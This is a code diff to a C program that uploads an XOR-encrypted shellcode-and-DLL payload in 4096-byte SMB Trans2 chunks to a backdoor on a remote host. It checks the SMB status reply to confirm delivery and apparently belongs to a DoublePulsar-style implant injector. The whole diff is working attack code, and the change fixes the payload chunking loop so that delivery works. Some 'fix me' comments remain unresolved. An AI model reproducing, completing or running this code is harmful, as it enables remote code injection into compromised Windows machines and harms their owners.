@@ -257,13 +257,21 @@ int main(int argc, char* argv[])
 	//Copy the encrypted shellcode & DLL in 4096 byte chunks
 	//reads the response from the SMB response packet to determine if status is good or bad
 	int ctx;
-	int BUFLEN = 4064;
-	int encrypted_buffer_len;
-	encrypted_buffer_len = sizeof(encrypted);
-	int BytesToRead = sizeof(encrypted);
-	printf("Uploading file...%d bytes to send\n", BytesToRead);
-	for (ctx = 0; ctx < encrypted_buffer_len; ctx += BUFLEN)
+	int encrypted_buffer_len = sizeof(encrypted);
+	int bytesLeft = encrypted_buffer_len;
+	printf("Uploading file...%d bytes to send\n", encrypted_buffer_len);
+	for (ctx = 0; ctx < encrypted_buffer_len;)
 	{
+		if (bytesLeft < 4096)
+		{
+			printf("Bytes left is less than 4096!...Generating smaller packet!\n");
+			memcpy((unsigned char*)big_packet, (unsigned char*)encrypted + ctx, bytesLeft);
+			//send(s, (char*)Trans2SESSION, 4178, 0);
+			//send(s, &buf, 4178, 0);
+			send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
+			recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+			break;
+		}
 		memcpy(big_packet, trans2_request, sizeof(trans2_request));
 
 		//update TreeId, UserID, ProcessID & MultiplexID in packet
@@ -284,8 +292,8 @@ int main(int argc, char* argv[])
 		big_packet[52] = '\x00';
 		
 		//fix me
-		//copy 4064 bytes at a time from the XOR encrypted buffer
-		memcpy(big_packet +  sizeof(trans2_request), (char*)encrypted+ctx, BUFLEN);
+		//copy 4096 bytes at a time from the XOR encrypted buffer
+		memcpy(big_packet +  sizeof(trans2_request), (char*)encrypted+ctx, 4096);
 
 		//FIX ME
 		//fix data len values
@@ -294,8 +302,9 @@ int main(int argc, char* argv[])
 		//send the payload(shellcode + dll) in chunk of 0x1000(4096) bytes to backdoor.
 		send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
 		recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+		
 		//subtract BytesToRead by how much we sent
-		numBytesToRead -= 4064;
+		bytesLeft -= 4096;
 		//compare the NT_STATUS response to 0xC0000002 ( STATUS_NOT_IMPLEMENTED )
 		if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
 		{
@@ -306,8 +315,8 @@ int main(int argc, char* argv[])
 			goto cleanup;
 		}
 	
-		//increment CTX pointer by 1, so the correct bytes next loop will be copied
-		ctx++;
+		//increment CTX pointer by 4096, so the correct bytes next loop will be copied
+		ctx += 4096;
 	}
 
 	//command received successfully!
